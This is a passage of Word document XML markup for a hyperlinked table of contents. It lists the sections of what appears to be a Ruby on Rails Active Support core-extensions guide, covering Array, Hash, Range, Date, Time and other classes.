          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId446" w:anchor="8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>BigDecimal</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="01C62235" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId447" w:anchor="9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Enumerable</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="291AFBBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId448" w:anchor="9-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>sum</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B3822C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId449" w:anchor="9-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>index_by</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="039B2814" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId450" w:anchor="9-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>many?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="725D3D70" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId451" w:anchor="9-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>exclude?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7E0AD809" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId452" w:anchor="10" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Array</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="010ED645" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId453" w:anchor="10-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Accessing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="313ED86E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId454" w:anchor="10-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Adding Elements</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5301B2C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId455" w:anchor="10-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Options Extraction</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="03335D56" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId456" w:anchor="array-conversions" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Conversions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6490657C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId457" w:anchor="10-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Wrapping</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12923D90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId458" w:anchor="10-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Grouping</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F507CEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId459" w:anchor="11" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hash</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1DD5721B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId460" w:anchor="hash-conversions" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Conversions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20873FC4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId461" w:anchor="11-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Merging</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FA60064" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId462" w:anchor="11-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Diffing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E69F364" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId463" w:anchor="11-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Working with Keys</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="61AB0EEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId464" w:anchor="11-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Slicing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7A68A4DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId465" w:anchor="11-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Extracting</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B899B69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId466" w:anchor="11-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Indifferent Access</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="091BDEFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId467" w:anchor="12" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Regexp</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0D467391" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId468" w:anchor="12-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>multiline?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62CC4B7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId469" w:anchor="13" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Range</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5278844D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId470" w:anchor="13-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>to_s</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="747856E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId471" w:anchor="13-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>step</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="47AB19C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId472" w:anchor="13-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>include?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A0918A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId473" w:anchor="13-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>overlaps?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1A036FF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId474" w:anchor="14" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Proc</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10EB6ADE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId475" w:anchor="14-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>bind</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="326F7E19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId476" w:anchor="15" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Date</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7A454870" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId477" w:anchor="15-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Calculations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4EF8FC34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId478" w:anchor="date-conversions" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Conversions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="40F0391F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId479" w:anchor="16" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>DateTime</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5ACC391F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId480" w:anchor="calculations-datetime" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Calculations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67B83273" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId481" w:anchor="17" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Time</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20745DF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId482" w:anchor="time-calculations" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Calculations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2B458DB2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId483" w:anchor="17-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Time Constructors</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2659ABA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId484" w:anchor="18" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>File</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="591ACBCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId485" w:anchor="18-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
